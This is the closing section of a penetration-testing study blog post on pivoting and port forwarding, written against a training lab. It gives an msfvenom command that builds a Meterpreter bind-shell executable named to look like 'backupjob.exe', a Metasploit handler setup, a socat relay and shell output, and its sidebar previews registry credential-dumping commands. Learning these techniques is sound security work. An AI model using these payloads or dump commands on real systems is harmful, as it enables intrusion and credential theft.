+<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><h3 id="Bind-Shell-Preparation-Payload-Bind-Setup"><a href="#Bind-Shell-Preparation-Payload-Bind-Setup" class="headerlink" title="Bind Shell Preparation (Payload + Bind Setup)"></a>Bind Shell Preparation (Payload + Bind Setup)</h3><p>Create Bind Shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
+
+<p>Configuring &amp; Starting multi&#x2F;handler</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT Bind-port-on-n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n → n+1 )"></a>Creating the Reverse Port Forwarding Tunnel ( n → n+1 )</h3><h6 id="Socat-1"><a href="#Socat-1" class="headerlink" title="Socat"></a>Socat</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:Bind-port-on-n+1,fork TCP4:n+2-machine:Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
+
+<h3 id="Execute-Bind-Shell"><a href="#Execute-Bind-Shell" class="headerlink" title="Execute Bind Shell"></a>Execute Bind Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: INLANEFREIGHT\victor</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io">Twistzz</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://twistzz-ctf.github.io/2025/11/22/Pivoting-And-Port-Forwarding/">https://twistzz-ctf.github.io/2025/11/22/Pivoting-And-Port-Forwarding/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Local-Port-Forwarding/">Local-Port-Forwarding</a><a class="post-meta__tags" href="/tags/Dynamic-Port-Forwarding/">Dynamic-Port-Forwarding</a><a class="post-meta__tags" href="/tags/Proxychains/">Proxychains</a><a class="post-meta__tags" href="/tags/Rpivot/">Rpivot</a><a class="post-meta__tags" href="/tags/sshuttle/">sshuttle</a><a class="post-meta__tags" href="/tags/plink/">plink</a><a class="post-meta__tags" href="/tags/Proxifier/">Proxifier</a><a class="post-meta__tags" href="/tags/socat/">socat</a><a class="post-meta__tags" href="/tags/Reverse-Port-Forwarding/">Reverse-Port-Forwarding</a><a class="post-meta__tags" href="/tags/Chisel/">Chisel</a></div><div class="post-share"><div class="social-share" data-image="/images/avatar.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/25/Extracting-Passwords-from-Windows-Systems/" title="Extracting Passwords from Windows Registry."><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Extracting Passwords from Windows Registry.</div></div><div class="info-2"><div class="info-item-1">Dump SAM, SYSTEM, And SECURITYOfflineCopy RegistryKey Registry Hives:  HKLM\SAM - Contains local user password hashes  HKLM\SYSTEM - Contains boot key to decrypt SAM  HKLM\SECURITY - Contains cached domain credentials &amp; LSA secrets   12345C:\WINDOWS\system32&gt; reg.exe save hklm\sam C:\sam.saveC:\WINDOWS\system32&gt; reg.exe save hklm\system C:\system.saveC:\WINDOWS\system32&gt; reg.exe save hklm\security C:\security.save  SecretsdumpDump hash1impacket-secretsdump -sam sam.save -security...</div></div></div></a><a class="pagination-related" href="/2025/11/21/MySQL-Exploitation/" title="MySQL Exploitation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">MySQL Exploitation</div></div><div class="info-2"><div class="info-item-1">Secure File Privilegessecure_file_priv in MySQL controls where you can read&#x2F;write files.  Only users with the FILE privilege can use LOAD DATA, SELECT INTO OUTFILE, or LOAD_FILE().  Settings: of Secure File Privileges  Empty: No restriction (not secure).  Directory path: Can only read&#x2F;write in that folder.  NULL: File operations are disabled.     Example :In the following example, the secure_file_priv variable is empty, which means MySQL can read and write files from any directory t...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Twistzz</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">417</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">66</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Twistzz-cb" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Local-Port-Forwarding"><span class="toc-number">1.</span> <span class="toc-text">Local Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH-n"><span class="toc-number">1.1.</span> <span class="toc-text">SSH (n)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Port-Forwarding"><span class="toc-number">2.</span> <span class="toc-text">Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux"><span class="toc-number">2.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#meterpreter-n"><span class="toc-number">2.1.1.</span> <span class="toc-text">meterpreter (n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptunnel-ng"><span class="toc-number">2.1.2.</span> <span class="toc-text">ptunnel-ng</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Server-Side-n-1"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">Server Side ( n+1 )</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Client-Side-n"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">Client Side ( n )</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Example-Port-forward-SSH"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">Example : Port forward SSH</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Server-Side-n-1-1"><span class="toc-number">2.1.2.3.1.</span> <span class="toc-text">Server Side ( n+1 )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Client-Side-n-1"><span class="toc-number">2.1.2.3.2.</span> <span class="toc-text">Client Side ( n )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Connect-to-the-target-port"><span class="toc-number">2.1.2.3.3.</span> <span class="toc-text">Connect to the target port</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Example-Port-forward-RDP"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">Example : Port forward RDP</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Client-Side-n-2"><span class="toc-number">2.1.2.4.1.</span> <span class="toc-text">Client Side ( n )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Server-Side-n-1-2"><span class="toc-number">2.1.2.4.2.</span> <span class="toc-text">Server Side ( n+1 )</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Connect-RDP"><span class="toc-number">2.1.2.4.3.</span> <span class="toc-text">Connect RDP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows"><span class="toc-number">2.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Netsh-n-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">Netsh (n+1)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dynamic-Port-Forwarding"><span class="toc-number">3.</span> <span class="toc-text">Dynamic Port Forwarding</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-1"><span class="toc-number">3.1.</span> <span class="toc-text">Linux</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Using-Proxychains"><span class="toc-number">3.1.1.</span> <span class="toc-text">Using Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH-n-1"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">SSH (n)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-n"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">Meterpreter (n)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Start-the-SOCKS-Proxy"><span class="toc-number">3.1.1.2.1.</span> <span class="toc-text">Start the SOCKS Proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Add-Route-to-internal-network"><span class="toc-number">3.1.1.2.2.</span> <span class="toc-text">Add Route to internal_network</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rpivot"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">Rpivot</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Server-attacker-machine-n"><span class="toc-number">3.1.1.3.1.</span> <span class="toc-text">Server (attacker machine - n)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Client-pivot-machine-n-1"><span class="toc-number">3.1.1.3.2.</span> <span class="toc-text">Client (pivot machine - n+1)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Chisel"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">Chisel</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Chisel-Reverse-Pivot"><span class="toc-number">3.1.1.5.</span> <span class="toc-text">Chisel Reverse Pivot</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Configure-Proxychains-n"><span class="toc-number">3.1.1.6.</span> <span class="toc-text">Configure Proxychains (n)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Without-Proxychains"><span class="toc-number">3.1.2.</span> <span class="toc-text">Without Proxychains</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sshuttle-n"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">sshuttle (n)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-1"><span class="toc-number">3.2.</span> <span class="toc-text">Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#plink-exe-n"><span class="toc-number">3.2.1.</span> <span class="toc-text">plink.exe (n)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SSH-Dynamic-SOCKS-Proxy"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">SSH Dynamic SOCKS Proxy</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Proxy-Handling-Windows"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">Proxy Handling (Windows)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse-Port-Forwarding-Reverse-Bind-Shell"><span class="toc-number">4.</span> <span class="toc-text">Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">4.1.</span> <span class="toc-text">Reverse Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Reverse-Shell-Preparation-Payload-Listener-Setup"><span class="toc-number">4.1.1.</span> <span class="toc-text">Reverse Shell Preparation (Payload + Listener Setup)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-%E2%86%92-n"><span class="toc-number">4.1.2.</span> <span class="toc-text">Creating the Reverse Port Forwarding Tunnel ( n+1 → n )</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SSH"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#meterpreter"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">meterpreter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Socat"><span class="toc-number">4.1.2.3.</span> <span class="toc-text">Socat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execute-Reverse-Shell"><span class="toc-number">4.1.3.</span> <span class="toc-text">Execute Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bind-Shell"><span class="toc-number">4.2.</span> <span class="toc-text">Bind Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bind-Shell-Preparation-Payload-Bind-Setup"><span class="toc-number">4.2.1.</span> <span class="toc-text">Bind Shell Preparation (Payload + Bind Setup)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-%E2%86%92-n-1"><span class="toc-number">4.2.2.</span> <span class="toc-text">Creating the Reverse Port Forwarding Tunnel ( n → n+1 )</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Socat-1"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">Socat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execute-Bind-Shell"><span class="toc-number">4.2.3.</span> <span class="toc-text">Execute Bind Shell</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/07/Abusing-Foreign-Group-Membership/" title="Abusing Foreign Group Membership">Abusing Foreign Group Membership</a><time datetime="2026-07-07T07:29:09.000Z" title="Created 2026-07-07 08:29:09">2026-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Forest-Trust-Enumeration/" title="Forest Trust Enumeration">Forest Trust Enumeration</a><time datetime="2026-07-06T14:00:25.000Z" title="Created 2026-07-06 15:00:25">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Child-Parent-Trust-Enumeration/" title="Child-Parent Trust Enumeration">Child-Parent Trust Enumeration</a><time datetime="2026-07-06T13:42:32.000Z" title="Created 2026-07-06 14:42:32">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Users-Groups/" title="Users &amp; Groups">Users &amp; Groups</a><time datetime="2026-07-06T13:13:08.000Z" title="Created 2026-07-06 14:13:08">2026-07-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/06/Domain-and-ACLs/" title="Domain and ACLs">Domain and ACLs</a><time datetime="2026-07-06T12:24:06.000Z" title="Created 2026-07-06 13:24:06">2026-07-06</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Twistzz</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="Search for Posts" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
